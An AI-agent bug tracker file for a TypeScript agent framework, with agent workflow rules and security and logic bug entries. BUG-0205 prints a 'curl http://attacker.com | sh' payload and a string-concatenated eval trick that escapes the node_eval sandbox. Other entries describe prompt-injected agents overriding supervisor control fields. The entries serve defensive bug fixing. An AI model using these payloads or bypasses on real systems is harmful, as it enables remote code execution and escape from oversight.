# 🐛 Bug Tracker — Agent Shared State

> **This file is the shared state layer between three autonomous agents.**
> Do NOT manually reorder entries. Agents append and update in-place.

---

## Meta

| Key | Value |
|---|---|
| **Last CI Sentinel Pass** | `2026-03-20T22:51:00Z` |
| **Last Hunter Scan** | `2026-03-20T22:31:00Z` |
| **Last Fixer Pass** | `2026-03-21T07:35:00Z` |
| **Last Validator Pass** | `2026-03-21T05:53:04Z` |
| **Last Digest Run** | `2026-03-21T05:52:59Z` |
| **Last Security Scan** | `2026-03-23T16:20:00Z` |
| **Hunter Loop Interval** | `5min` |
| **Fixer Loop Interval** | `2min` |
| **Validator Loop Interval** | `5min` |
| **Last TestGen Run** | `2026-03-20T23:35:00Z` |
| **Last Git Manager Pass** | `2026-03-21T06:00:00Z` (Cycle 227) |
| **Last Supervisor Pass** | `2026-03-21T05:55:29Z` |
| **Total Found** | `399` |
| **Total Pending** | `2` |
| **Total In Progress** | `0` |
| **Total Fixed** | `67` |
| **Total In Validation** | `0` |
| **Total Verified** | `0` |
| **Total Blocked** | `16` |
| **Total Reopened** | `2` |

---

## Status Lifecycle

```
pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
                                                → reopened → (re-enters as pending)
                       → blocked                           ⏸️ (waiting on human)
```

- **pending** — Logged by Hunter, waiting for Fixer.
- **in-progress** — Fixer is actively working on it.
- **fixed** — Fixer believes it is resolved, waiting for Validator.
- **in-validation** — Validator is actively reviewing the fix.
- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
- **blocked** — Fixer cannot resolve without human intervention.

---

## Agent Instructions

### Bug Hunter Agent (Producer)

1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
4. Append new bugs to the `## Bugs` section using the exact template below.
5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
6. Assign the next sequential `BUG-XXXX` ID.
7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.

### Bug Fixer Agent (Consumer)

1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
2. Set `status: in-progress` and fill `fixer_started` before beginning work.
3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.

#### Git Workflow (CRITICAL — follow exactly)

4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
5. **Create or recreate branch:**
   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
14. Increment `reopen_count` if this was a reopened bug.
15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.

#### Guardrails
- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`

16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.

### Bug Validator Agent (Quality Gate)

1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
2. Set `status: in-validation` and fill `validator_started` before beginning review.

#### Pre-flight Checks (before reviewing code)

3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.

#### Code Review

6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).

#### On Validation Success — Merge, Archive, Cleanup

9. **Merge to main:**
   ```
   git checkout main
   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
   ```
10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).

#### On Validation Failure — Reopen

15. If any check fails: `git checkout main` (abandon the branch review).
16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`

#### Final

19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).

---

## Bug Entry Template

```markdown
### BUG-XXXX
- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
- **severity:** `critical` | `high` | `medium` | `low`
- **file:** `path/to/file.ts`
- **line:** `42`
- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
- **description:** Brief description of the bug or gap.
- **context:** Why this is a problem / what could go wrong.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-13T10:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
```

---

## Bugs














### BUG-0205
- **status:** `blocked`
- **severity:** `critical`
- **file:** `packages/tools/src/code-execution/node-eval.ts`
- **line:** `57`
- **category:** `security-injection`
- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** ``
- **hunter_found:** `2026-03-17T03:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
- **validator_started:** `2026-03-18T01:20:50Z`
- **validator_completed:** `2026-03-18T01:30:00Z`
- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`
- **test_generated:** `true`
- **test_file:** `packages/tools/src/__tests__/node-eval-esm-bypass.test.ts`

---

### BUG-0256
- **status:** `blocked`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `11`
- **category:** `security-auth`
- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
- **reopen_count:** `4`
- **branch:** `bugfix/BUG-0256`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 4 failed fix attempts. Requires human review.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:24:00Z`
- **validator_notes:** `REOPENED: Fix summary says "Added export type { A2AServerOptions } from ./server/index.js to barrel" — this is a type re-export and has zero relation to the security-auth vulnerability (unauthenticated RPC access). The server still accepts all requests without auth when apiKey is omitted. No authentication logic was added. reopen_count now 4 — Fixer should auto-block per guardrail.`

---

### BUG-0264
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/lsp/client.ts`
- **line:** `526`
- **category:** `type-error`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0264`
- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:25:00Z`
- **validator_completed:** `2026-03-20T22:25:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. All 3 original failures persist unchanged across 3 fix/validate cycles: (1) no jsonrpc === "2.0" gate, (2) dead typeof id === "undefined" check (never true inside "id" in message guard), (3) no result/error presence validation. Requires human review.`
- **test_generated:** `true`
- **test_file:** `src/__tests__/lsp-client-message-validation.test.ts`

---

### BUG-0306
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `269`
- **category:** `missing-error-handling`
- **description:** `onError` hook awaited without try/catch. If `onError` itself throws, the hook exception replaces the original error (the `finally` block runs but the original `lastError` is lost), making diagnosis impossible.
- **context:** Known bugs cover `onStart` (line 196) and `onComplete` (line 209) hooks in the same file — this is the third lifecycle hook (`onError` at line 269) with the same missing guard. Fix: wrap in try/catch, log the hook error, and re-throw the original `lastError`.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0306`
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-21T05:08:34Z`
- **validator_completed:** `2026-03-21T05:23:12Z`
- **validator_notes:** `REOPENED (3rd time): Same regression as 2nd attempt — onError IS wrapped in try/catch but onStart/onComplete guards STRIPPED from main. Diff is -107/+27 lines, far exceeding the claimed +5/-1. Branch also removes BatchError, dispose(), _pendingRemoval, and other unrelated constructs. reopen_count now 3 — Fixer should auto-block per guardrail. The fix is trivially a 5-line change but the branch keeps rebuilding pool.ts from scratch instead of patching main.`

---

### BUG-0303
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/lsp/index.ts`
- **line:** `134`
- **category:** `security-injection`
- **description:** `getErrorDiagnosticsText()` embeds `filePath` in an XML attribute (`<diagnostics file="${filePath}">`) without escaping, enabling XML attribute injection that can manipulate LLM context parsing.
- **context:** The `filePath` parameter is passed directly into the XML attribute at line 134. A file path containing `"` followed by additional XML attributes or closing tags (e.g. `path" malicious="true`) would break out of the attribute context. While this output is consumed as LLM context (not browser HTML), it could affect how the LLM interprets diagnostic boundaries — a crafted file path could inject fake diagnostic blocks or override the file attribute to misattribute errors. Additionally, `formatDiagnostic()` at line 244 embeds `d.message` and `d.source` from LSP server responses without escaping. Fix: apply XML escaping to `filePath`, `d.message`, and `d.source` using the existing `escXml()` function from `skill-loader.ts`. OWASP A03:2021 - Injection.
- **reopen_count:** `1`
- **branch:** `bugfix/BUG-0303`
- **hunter_found:** `2026-03-20T20:04:36Z`
- **fixer_started:** `2026-03-21T07:15:00Z`
- **fixer_completed:** `2026-03-21T07:15:00Z`
- **fix_summary:** `Added escapeXml() with all 5 XML special chars (including apos). Applied to filePath, d.message, d.source. Fresh branch from main, no unrelated changes.`
- **validator_started:** `2026-03-21T05:29:48Z`
- **validator_completed:** `2026-03-21T05:37:00Z`
- **validator_notes:** `REOPENED: escapeXml() handles &, <, >, " but missing single-quote (&apos;). Branch also introduces tsc errors in unrelated pregel files (TS2554, TS2741). Fixer must: add single-quote escape, delete old branch, create fresh from main.`

---

### BUG-0304
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/guardrails/budget.ts`
- **line:** `57`
- **category:** `security-auth`
- **description:** `BudgetTracker.record()` performs no validation on `usage.inputTokens` or `usage.outputTokens`, allowing NaN or negative values to permanently disable all budget enforcement.
- **context:** If a model adapter returns `inputTokens: NaN` (e.g. from a malformed API response or parsing error), the cost calculation at line 67-69 produces `NaN`, and `this.totalCost += NaN` poisons the accumulator to `NaN` permanently. At line 138, `NaN > limit` evaluates to `false`, so the cost budget check never triggers again — the budget is silently bypassed for all subsequent calls. Similarly, negative token values (line 57-58) decrease the accumulator, effectively granting unlimited budget by "depositing" tokens. A compromised or buggy model adapter can exploit either path to bypass all cost and token limits. Fix: validate that `inputTokens` and `outputTokens` are finite non-negative numbers before accumulating, and treat NaN/negative as zero or throw. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0304`
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:55:00Z`
- **validator_completed:** `2026-03-20T23:55:00Z`
- **validator_notes:** `Auto-blocked after 3+ failed attempts. Fix on branch but NEVER merged to main. Requires human merge.`

---

### BUG-0305
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `122`
- **category:** `security-auth`
- **description:** Handoff context merge at line 122 (`{ ...state.context, ...handoff.context }`) performs an unfiltered shallow merge, allowing a handing-off agent to overwrite privileged shared state fields such as `__deadlineAbsolute` or `lastAgentError`.
- **context:** When an agent executes a Handoff, `handoff.context` is spread directly into the shared `state.context` with no key filtering. An agent can craft a Handoff with `context: { __deadlineAbsolute: Infinity }` to disable deadline enforcement, or inject `lastAgentError: null` to clear error state and bypass supervisor error recovery. Since agent code can be influenced by prompt injection, this is an escalation vector: a prompt-injected agent can manipulate swarm-level control fields through the Handoff mechanism. Fix: filter handoff context keys against a denylist of privileged/internal fields (those starting with `__` or known supervisor control fields), or use an allowlist of user-defined context keys. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0305-ctx`
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** `2026-03-21T03:47:00Z`
- **fixer_completed:** `2026-03-21T03:54:00Z`
- **fix_summary:** `Filtered handoff.context keys starting with __ before merging into state.context in src/swarm/agent-node.ts. Uses Object.fromEntries/filter to strip privileged internal fields, preventing prompt-injected agents from overwriting supervisor control fields like __deadlineAbsolute.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0310
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/streaming.ts`
- **line:** `72`
- **category:** `logic-bug`
- **description:** `TokenStreamWriter.push()` has no guard against writes after `end()`. If `push(token)` is called after `end()` and the async iterator has already returned, the token is silently queued but never consumed — permanently dropped.
- **context:** Triggered when a streaming LLM call emits a final token concurrently with a node timeout calling `end()`. The `push` method does not check `this.done` before enqueuing. Fix: add `if (this.done) return` at the top of `push()`.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0310`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T03:47:00Z`
- **fixer_completed:** `2026-03-21T03:54:00Z`
- **fix_summary:** `Added if (this.done) return guard at the top of TokenStreamWriter.push() in src/streaming.ts. Prevents silently queuing tokens after end() has been called.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0311
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `43`
- **category:** `logic-bug`
- **description:** `evict()` sets `s.status = "expired"` then immediately deletes the entry from the Map. A subsequent `get(resumeId)` returns `null`, making the expired status unreachable via the public API — callers cannot distinguish "expired" from "never existed".
- **context:** The comment on `get()` says sessions remain visible so callers can observe final status, but that only holds for `"resumed"` sessions. Fix: keep expired sessions in the Map for a grace period before final deletion.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0311`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Keep expired sessions visible for 60s grace period in resume store.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0312
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/coordination/pubsub.ts`
- **line:** `34`
- **category:** `race-condition`
- **description:** `publish()` iterates `this.subscribers` Map with `for...of` while subscriber handlers can call `subscribe()` or unsubscribe during delivery. New subscriptions added mid-iteration may or may not be visited in the same `publish()` call, causing non-deterministic event delivery.
- **context:** Per ECMAScript spec, entries added to a Map during `for...of` iteration will be visited if not yet passed. Handlers that add new subscriptions during delivery can receive the event that triggered them. Fix: snapshot subscribers before iterating (`[...this.subscribers.entries()]`).
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0312`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Snapshot subscribers Map and handler Sets before iterating in publish().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/pubsub-snapshot-during-publish.test.ts`

---

### BUG-0319
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/loop/experimental-executor.ts`
- **line:** `45`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0319`
- **description:** `timeBudget` is used as the timeout for each individual phase (baseline, applyChanges, post-measurement) rather than a total budget, so total wall time can reach 3x the specified budget.
- **context:** A caller passing `timeBudget: 5000` expecting the experiment to complete within 5 seconds will instead see up to 15 seconds of execution, violating time expectations and potentially causing cascading timeouts.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Track elapsed time; pass remaining budget to each phase instead of full timeBudget.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0320
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/compile-ext.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0320`
- **description:** `def` is double-cast via `as SwarmAgentDef<Record<string, unknown>> as any` when registering a dynamically spawned agent, completely erasing the generic state type parameter `S`.
- **context:** The registry stores the agent with the wrong state type, so `createAgentNode` receives a state typed as `Record<string, unknown>` instead of the actual swarm state type, making strongly-typed state field access invisible to the type checker.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T03:56:00Z`
- **fixer_completed:** `2026-03-21T04:02:00Z`
- **fix_summary:** `Removed double cast in src/swarm/compile-ext.ts. Uses plain registry.register(def).`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0321
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/docx.ts`
- **line:** `15`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0321`
- **description:** The mammoth module is cast directly as `MammothLib` without checking for a `.default` export wrapper, so when mammoth is a CJS module loaded via ESM dynamic `import()` the `extractRawText` function resolves to undefined.
- **context:** CJS packages imported via ESM `import()` frequently expose their API under `.default`. The call to `extractRawText` will crash with "not a function" at runtime rather than surfacing a clear dependency-resolution error.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T03:56:00Z`
- **fixer_completed:** `2026-03-21T04:02:00Z`
- **fix_summary:** `Handle CJS default export wrapper in mammoth dynamic import. Uses (raw.default ?? raw) pattern.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0322
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/agents/define-agent.ts`
- **line:** `159`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0322`
- **description:** maxTokens budget check strips toolCalls from the assistant message before breaking, producing a malformed conversation history where tool-call content has no matching toolCalls field.
- **context:** When the token budget is exceeded mid-turn, the assistant message is pushed with toolCalls removed but tool-referencing content intact. LLM APIs that validate message sequencing will reject the subsequent request.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Push full assistantMsg with toolCalls intact when breaking on budget.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0323
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/messages/index.ts`
- **line:** `168`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0323`
- **description:** trimMessages hoists all system messages to the front of the array regardless of their original positions, destroying positional semantics when multiple system messages are interleaved with conversation turns.
- **context:** Conversations that inject system messages mid-conversation will have their message ordering silently corrupted. The maxMessages limit also applies only to non-system messages.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Only hoist first system message; preserve positions of interleaved system messages.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0325
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/mcp/client.ts`
- **line:** `240`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0325`
- **description:** callTool casts response.result (typed unknown) directly to MCPCallToolResult with no structural validation, so a malformed MCP server response causes a runtime crash when callers destructure the result.
- **context:** Any MCP server returning a non-conforming result object will cause downstream crashes. The same unsafe cast pattern exists at line 121 for MCPInitializeResult.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Validate MCP server response structure before casting at callTool and initialize.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0326
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0326`
- **description:** Redis v4 fallback path assigns raw createClient result as RedisClient without a shim, but RedisClient.del uses rest params while redis v4 del expects an array — multi-key deletes on v4 backend will break.
- **context:** The ioredis path correctly shims del with r.del(...keys), but the redis v4 branch has no such adapter.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Add del shim for redis v4 multi-key compatibility.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0328
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/stripe/index.ts`
- **line:** `59`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0328`
- **description:** loadStripeInstance creates a new Stripe SDK client on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** In long-running agent sessions with many Stripe tool calls, file descriptors grow without bound, eventually causing EMFILE or connection pool exhaustion.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Cache Stripe SDK client instance keyed by API key to prevent connection pool leak.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0329
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/slack/index.ts`
- **line:** `40`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0329`
- **description:** loadSlackClient creates a new WebClient on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** Same pattern as BUG-0328 but for Slack — per-call client creation causes socket handle growth in long-running sessions.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Cache Slack WebClient instance keyed by token to prevent connection pool leak.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0330
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/coordination/request-reply.ts`
- **line:** `78`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0330`
- **description:** Timeout callback and `reply()` method both check-then-mutate `req.resolved` non-atomically — if timeout fires between `reply()` capturing the resolver and setting `resolved = true`, both the rejection and resolution fire on the same Promise.
- **context:** Double-settling a Promise is silently ignored by V8, but downstream `.then()` chains may observe the resolved value after the rejection handler already ran, causing inconsistent state in request-reply coordination patterns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Make resolved flag check-and-set atomic in reply() to prevent double-settlement.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/request-reply-atomic-resolved.test.ts`

---

### BUG-0331
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/store/index.ts`
- **line:** `126`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0331`
- **description:** `InMemoryStore.put()` checks `this.data.size` against `maxItems` before an `await this.embedFn()` call, then inserts after the await — concurrent `put()` calls all pass the size check before any insert, exceeding the capacity limit.
- **context:** In high-throughput agent loops that write to the store concurrently, the maxItems invariant is silently violated, causing unbounded memory growth in what is supposed to be a bounded store.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Add post-insert capacity re-check in InMemoryStore.put() to prevent exceeding maxItems.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0332
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/checkpointers/redis.ts`
- **line:** `155`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0332`
- **description:** `delete()` reads steps via `zrange` then issues separate `del` calls for each data key and the index key — a concurrent `put()` between the zrange and del leaves an orphaned data key with no index entry pointing to it.
- **context:** Orphaned keys accumulate in Redis over time, consuming memory that is never reclaimed. Related to but distinct from BUG-0304 (non-atomic `get()`).
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
